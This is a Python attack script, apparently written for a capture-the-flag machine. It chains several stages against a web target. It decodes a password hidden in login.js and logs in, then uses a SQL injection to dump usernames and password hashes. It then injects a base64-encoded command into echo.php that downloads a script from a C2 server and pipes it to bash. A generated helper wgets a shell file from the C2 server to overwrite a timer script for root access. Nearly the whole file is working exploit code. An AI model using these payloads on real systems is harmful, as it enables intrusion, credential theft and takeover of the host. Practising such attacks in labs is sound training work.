#!/usr/bin/env python3
############################################################
# This script utilizes the credentials discovered using
# stage1 to dump usernames and password hashes of users on 
# the target.  
#
# If "-a" is added to the arguments, the script will
# automatically save the information pulled down during
# the attack.
#
# After the information has been acquired by this script,
# the attacker must use a hash cracking tool to crack
# the password hashes pulled down.
#
# After cracking the hashes, the attacker can proceed to 
# the next stage of the attack.
############################################################
# Example Call:
# python3 stage2.py $TARGET user1 password1 -a
############################################################

import argparse
import base64
import json
import os
import platform
import re
from click import password_option
import requests

ANSI_CLRLN = "\x1b[2K\r"
ANSI_CLRSC = "\x1b[2J\x1b[H"
ANSI_RST = "\x1b[0m"
ANSI_RED = "\x1b[31;1m"
ANSI_GRN = "\x1b[32;1m"
ANSI_YLW = "\x1b[33;1m"
ANSI_BLU = "\x1b[34;1m"

class attacker:
    def __init__(self, targetIP, username, password):
        self.baseURL = f"http://{targetIP}"
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.data = str()
        self.__timeout = 30
        return
    
    def decode_password(self, data):
        arrayDict = dict()
        message = str()
        password = str()
        success = bool()

        try:
            ############################################################
            # Setup regular expression patterns for both the password
            # and password arrays. 
            #
            # The password lookup arrays are javascript arrays so they
            # have the pattern: "name = [<data>]"
            #
            # The password is a series of array indicies concated
            # together, so it will have the pattern "array[index]+..."
            ############################################################
            arrayPattern = "[a-zA-Z] = \[.*\]"
            passwordPattern = "([a-zA-Z]\[[0-9]+\]\+)+[a-zA-Z]\[[0-9]+\]"

            # build lookup for password decoding
            arrays = re.findall(arrayPattern, data)
            for array in arrays:
                array_split = array.replace(' ','').replace('[','').replace(']','').replace('"','').split('=')
                arrayDict[array_split[0]] = array_split[1].split(',')

            passwordFormula = re.search(passwordPattern, data).group().split('+')
            for code in passwordFormula:
                code = code.replace('[','').replace(']','')
                password += arrayDict[code[0]][int(code[1:])]
            
            message = "password successfully decoded"
            success = True
        except Exception as ex:
            password = None
            message = str(ex)
            success = False
        
        return (password, success, message)
    
    def grab_page_flag(self):
        flag = str()
        message = str()
        success = bool()

        try:
            SysMsgNB("Search for flag on homepage")

            ############################################################
            # Setup regular expression pattern to use for matching
            # the flag.
            #
            # Pattern: fla<anything>{<anything>}
            ############################################################
            flag_pattern = "fla.*{.*}"
            target = "index.php"
            fullURL = f"{self.baseURL}/{target}"

            resp = self.session.get(fullURL)
            if resp.status_code >= 400:
                raise requests.HTTPError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            
            ############################################################
            # Search page for the flag pattern described above.
            ############################################################
            match = re.search(flag_pattern, resp.text)
            flag = resp.text[match.start():match.end()]
            message = "Page flag found."
            success = True
        except requests.Timeout:
            flag = None
            message = "Request timeout"
            success = False            
        except Exception as ex:
            flag = None
            message = str(ex)
            success = False

        return (flag, success, message)

    def login(self):
        loginURL = f"{self.baseURL}/login.php"
        dataDict = {"email": self.username, "password": self.password}

        try:
            ############################################################
            # Send POST request to login route.
            #
            # If a status code of 400 or larger is returned, there was
            # an error, so raise an issue and return false.
            #
            # If "\n\t\t" is returned, the login failed. Return false
            # and notify the user that the credentials are incorrect.
            ############################################################
            SysMsgNB(f"Attempting login with \"{self.username}\" and \"{self.password}\"")
            resp = self.session.post(loginURL, dataDict, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            elif resp.content == b"\n\t\t":
                raise ValueError(f"Incorrect credentials.")
            
            message = "Login successful."
            success = True
        except requests.Timeout:
            message = "Request timeout"
            success = False
        except Exception as ex:
            message = str(ex)
            success = False
        return (success, message)
    
    def pullLoginJS(self, outfile):
        message = str()
        password = str()
        success = bool()

        try:
            targetURL = f"{self.baseURL}/js/login.js"

            ############################################################
            # Reach out to the target, pull down "login.js" and save
            # a local copy for future analysis.
            ############################################################
            SysMsgNB(f"pulling down login script")
            resp = self.session.get(targetURL)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            
            SysMsgNB(f"saving script to \"{outfile}\"")
            with open(outfile, "wb") as fptr:
                fptr.write(resp.content)
            SysMsgNB(f"script saved to \"{outfile}\"")

            ############################################################
            # Send the contents of "login.js" to the "decode_password"
            # function, so the password that is in the script can be
            # decoded and used later.
            ############################################################
            password, success, message = self.decode_password(resp.text)
            if not(success):
                raise ValueError(message)

            message = "login script pulled"
            success = True
        except Exception as ex:
            password = None
            message = str(ex)
            success = False 

        return (password, success, message)
    
    def pull_script(self, c2, script):
        message = str()
        success = bool()

        try:
            target = "echo.php"
            fullURL = f"{self.baseURL}/{target}"

            ############################################################
            # Create python3 one-liner to pull down a script from the
            # C2 server and save the contents to "/tmp/script".
            #
            # The one-liner gets placed in a one-line shell command
            # that then makes the script executable (chmod +x) and
            # runs the script (/tmp/script).
            ############################################################
            pycmd = f"python3 -c \"import requests;r=requests.get(\'http://{c2}/{script}\');f=open(\'/tmp/script\',\'wb\');f.write(r.content);f.close()\""
            command = f"""{pycmd};chmod +x /tmp/script;/tmp/script"""

            ############################################################
            # If the length of the specified command is not a multiple
            # of 3, add spaces for padding. This is to prevent "="
            # from being in the request.
            ############################################################
            if (len(command) % 3) != 0:
                pad = '%20' * (3 - len(command) % 3)
                command = f"{command}{pad}"
            
            ############################################################
            # Base64 encode the command and convert it back to a 
            # string from bytes.
            ############################################################
            command = base64.b64encode(command.encode()).decode()
            command = command.strip("=")
            SysMsgNB("command built & encoded")

            ############################################################
            # The payload takes the command created above, forces the
            # target to base64 decode it and pipe the output of the
            # decoded base64 to "bash", executing the command.
            ############################################################
            payload = f"""{command} | base64 -d | bash"""

            ############################################################
            # URL encode spaces and pipes
            ############################################################
            payload = payload.replace(" ", "+").replace("|","%7C")
            SysMsgNB("payload successfully created")
            fullURL = f"{fullURL}?search={payload}"

            ############################################################
            # Send the payload to the target machine.
            #
            # If a status code of 400 or higher is returned, there was
            # an error, so raise an issue and return false.
            #
            # If a timeout occurs, assume that a reverse shell has been
            # opened with the target machine and return success.
            ############################################################
            SysMsgNB("sending malicious payload to target")
            resp = self.session.get(fullURL, timeout=self.__timeout, allow_redirects=True)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            
            message = "Exploit complete"
            success = True
        except requests.Timeout:
            message = "timeout detected. reverse shell could be executing"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False
        return (success, message)
    
    def save_data(self, outfile=None):
        if (outfile is None) or not(isinstance(outfile,str)):
            outfile = "extracted_data"
        
        try:
            SysMsgNB(f"Writing extracted data to \"{outfile}\"")
            with open(outfile, "wb") as fptr:
                if isinstance(self.data,str):
                    bytes_written = fptr.write(f"{self.data}\n".encode())
                elif isinstance(self.data,list) or isinstance(self.data,set):
                    bytes_written = int()
                    for extracted_line in self.data:
                        bytes_written += fptr.write(f"{str(extracted_line)}\n".encode())
                elif isinstance(self.data,dict):
                    bytes_written = int()
                    for k,v in self.data.items():
                        bytes_written += fptr.write(f"{k}:{v}\n".encode())
                else:
                    ErrMsg(f"Unknown Data Type ({type(self.data)})")
            message = f"{bytes_written} bytes writen to \"{outfile}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def sqli_attack(self, autosave=None):
        if (autosave is None) and not(isinstance(autosave,bool)):
            autosave = False

        vulnURL = f"{self.baseURL}/api/people/search"
        sqli = "x' OR 1=1 OR permissionPeople = 'admin"
        dataDict = {"namePeople": sqli}

        try:
            ############################################################
            # Attempt a SQL injection (SQLi) attack against the
            # /api/people/search API endpoint.
            #
            # If an status code of 400 or greater is returned, there was
            # an error, so raise an issue and return false.
            #
            # If "\n\t\t" was returned by the endpoint the SQLi was
            # unsuccessful, so return false.
            ############################################################
            SysMsgNB("Attempting SQLi")
            resp = self.session.post(vulnURL, data=dataDict, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            elif resp.content == b"\n\t\t":
                raise ValueError("Could Not Perform SQLi")
        
            ############################################################
            # The SQLi attack was successful. Save the returned info
            # to the local attack machine for future analysis and use.
            ############################################################
            self.data = json.loads(resp.content)[0]
            if autosave:
                success, message = self.save_data()
                if success:
                    SucMsg(message)
                else:
                    ErrMsg(message)

            message = "SQLi successful"
            success = True
        except Exception as ex:
            self.data = None
            message = str(ex)
            success = False

        return (self.data, success, message)

############################################################
# Functions: Formatting And Output
############################################################

def InfMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def SucMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def SysMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def InfMsgNB(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsgNB(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Functions: General
############################################################

def create_script(name, c2IP):
    message = str()
    success = bool()
    try:
        ############################################################
        # Generate script that will pull down a file called mshell
        # from the C2 server and overwrite /timers/timer.sh with
        # its contents.
        #
        # This will give root access to the target.
        ############################################################
        c2server = f"http://{c2IP}"
        content = f"""#!/bin/bash\nwget -O /timers/timer.sh {c2server}/mshell\nchmod +x /timers/timer.sh"""
        with open(name, "w") as fptr:
            fptr.write(content)
        message = "Script created."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False
    return (success, message)

def main():
    ############################################################
    # This if block is added in so ANSI characters can be used
    # if the OS running this script is Windows.
    ############################################################
    if platform.system().lower() == "windows":
        os.system("")

    parser = argparse.ArgumentParser()
    parser.add_argument("targetIP", help="IP address of target", type=str)
    parser.add_argument("-u", "--username", help="user to login as", type=str, default="daedalus", dest="username")
    parser.add_argument("-p", "--password", help="password to login with", type=str, default="password", dest="password")

    subparser = parser.add_subparsers(help="stage command", dest="stage")

    stage2 = subparser.add_parser("stage2", help="stage2 help")
    stage2.add_argument("-a","--autosave", help="autosave credentials to local file", default=False, action="store_true")

    stage3 = subparser.add_parser("stage3", help="stage3 help")
    stage3.add_argument("-b", help="create exploit script on local machine", default=False, action="store_true", dest="build")    
    stage3.add_argument("-c", help="C2 server IP", default="127.0.0.1", dest="c2ip", type=str)
    stage3.add_argument("-s", help="shell script to pull down", default="rooter.sh", dest="script", type=str)

    args = parser.parse_args()
    targetIP = args.targetIP
    username = args.username
    password = args.password

    attackStage = args.stage

    try:
        a = attacker(targetIP, username, password)

        if attackStage == "stage2":
            autosave = args.autosave

            a.password, success, message = a.pullLoginJS("login.js")
            if not(success):
                raise ValueError(message)

            success, message = a.login()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            data, success, message = a.sqli_attack(autosave=autosave)
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            for cred in data:
                SucMsg(f"{cred['namePeople']}:{cred['passwordPeople']:}")
        else:
            build = args.build
            c2ip = args.c2ip
            script = args.script

            success, message = a.login()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            if build:
                create_script(script, c2ip)

            flag, success, message = a.grab_page_flag()
            if not(success):
                raise ValueError(message)
            SucMsg(f"Flag Found: {flag}")

            success, message = a.pull_script(c2ip, script)
            if not(success):
                raise ValueError(message)
            SucMsg(message)
    except Exception as ex:
        ErrMsg(str(ex))
        exit(1)

    return

if __name__ == "__main__":
    main()
